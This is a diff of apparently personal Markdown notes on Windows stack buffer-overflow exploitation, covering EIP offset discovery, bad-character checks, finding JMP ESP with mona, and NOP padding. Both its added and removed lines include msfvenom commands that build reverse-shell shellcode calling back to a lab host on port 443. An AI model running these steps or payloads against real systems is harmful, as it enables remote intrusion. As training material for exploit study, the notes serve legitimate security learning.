@@ -105,7 +105,7 @@ Right-click on the instructions windows and select `Search For` ->
 Alternative, run `!mona find -s "/xFF/xE4" -m slmfc.dll` to find the OPCODE for `jmp esp` in the entire .DLL:
 ![BOF_STEP6_JMPESP3](images/BOF_STEP6_JMPESP3.png)
 
-Choose one of the pointers -> copy its address -> click on "Go to address in Disassembler" -> paste address:
+Choose one of the pointers -> copy its address -> click on "Go to address in Disassembler" -> paste address -> verify that the address actually contains a `JMP ESP` instruction:
 ![BOF_STEP6_JMPESP4](images/BOF_STEP6_JMPESP4.png)
 
 ---
@@ -113,12 +113,12 @@ Choose one of the pointers -> copy its address -> click on "Go to address in Dis
 
 ### 7. GENERATE SHELLCODE
 
+Generate shellcode and add it to the BOF exploit code. 
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
 
----
+Provide the shellcode decoder some stack-space to work with: `"\x90 * 16"` Append NOP instructions to the front of the shellcode.
 
-### 8. FINAL PAYLOAD + RUN EXPLOIT TO OBTAIN SHELL
-
-
+Final payload:
 ```Python
 #!/usr/bin/python
 #
@@ -177,116 +177,18 @@ except Exception as e:
 
 
 
+### 8. EXTRA
 
 
+Running out of shell code space?
 
-
-
-### Fuzzing -> Determine exact offset -> Control EIP register
-
-1. Fuzz application to determine rough amount of bytes to cause a crash.
-2. Generate offset-discovery string: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`
-3. Run script with-offset discovery string + look at value in EIP
-    * EIP is where we want to store address of a JMP ESP instruction
-    * Execution flow: EIP -> JMP ESP -> ESP (shellcode location)
-3. Calculate offset: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [value in EIP]`
-
-Now we know the exact #bytes needed to reach/control the EIP register so that we can overwrite it with JMP ESP address.
-
-### Checking for bad chars
-
-1. Generate string of bad characters (0x00 -> 0xFF)
-2. Use list of bad chars as payload + execute script.
-3. Observe crash + goto location in ESP register (right-click -> follow-in-dump)
-4. Observe the hex dump and see which character has truncated the rest of the payload that should come after it.
-5. Remove character from buffer + repeat steps until all bad chars have been found.
-
-### Find address of a JMP ESP in a DLL
-
-We need to find a module that contains a `JMP ESP` instruction which we can point to.
-
-1. `!mona modules` to list all the loaded modules for the application.
-2. Find a module that has no internal security mechanisms:
-   * No memory protection (ASLR: address randomisation / DEP: data execution prevention)
-   * Memory range of DLL does not contain bad characters
-3. Find a `JMP ESP` or equivalent instruction in the DLL.
-   * Click on the Executable Modules `e` icon to show list of all modules/DLLs loaded with the application.
-   * Locate the chosen DLL in step #3 and click on the DLL.
-   * Right-click on instruction window -> Search For -> Command -> `JMP ESP`
-   * If none are found: Search For -> Command Sequence -> `PUSH ESP | RETN` (equivalent command)
-   * If none are found: `!Mona find -s "\xFF\xE4" -m slmfc.dll` to find the opcode for `JMP ESP` in the whole slmfc.dll.
-4. Once `JMP ESP` has been found, verify that the address does actually contain the instruction
-   * Click on "Go to address in disassembler" button then enter in the address.
-   * Check that the address has `JMP ESP`
-
-### Generate and use shellcode
-
-1. Generate shellcode, target specific platform (windows x86), encode payload, avoid bad characters
-   `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
-   In front of the shellcode are instructions to decode the encoded payload.
-2. We need to provide the shellcode docoder some stack-space to work with
-   * Append NOP instructions to the front of the payload e.g. `"\x90 * 16"`
-3. 
-
-
-
-
---- 
-
-# BOF
-**1. Check buffer length to trigger overflow**  
-
-**2. Cofirm overflow length, append "A" * length**  
-
-**3. Generate Offset to check EIP, ESP location**  
-  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
-
-	Record value on EIP, select ESP and click "Follow in Dump"  
-	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> -l <length>  
-
-	Use !mona to find the offset after the overflow  
-	!mona findmsp  
-
-**4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode**
-
-**5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
-Add code:
-
-	badchar = [0x00]
-	for ch in range (0x00 , 0xFF+1):
-		if ch not in badchar:
-			<payload> += chr(ch)
-
-**6. Find JMP ESP address in the system.**
-	JMP ESP = FFE4
-
-	!mona jmp -r esp -cpb "\x00\x0A" << bad character
-
-	!mona modules
-	!mona find -s "\xff\xe4" -m brainpan.exe
-
-	check the value of the address by naviate to it.
-	Set breakpoint
-	Change "B" in EIP to the address of JMP ESP << littile edian
-
-	e.g. 0x311712f3 >> "\xf3\x12\x17\x31"
-
-	Run again to check is the breakpoint triggered
-
-**7. Add shellcode**
-	Add a few \x90 before shellcode to avoid shellcode being modify
-
-	msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
-	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
-
-**Bonus: Running out of shell code space?**
-Use the front of payload instead
+Use the front of payload instead.
 1. Is there any register points to the front of our payload? EAX, EDX?
 2. Check JMP register address
-	/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-
-	JMP EAX/EBX/ECX/EDX
-
+```
+$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+$ JMP EAX/EBX/ECX/EDX
+```
 3. Append the address as shell code.
 4. Add payload to the front
 
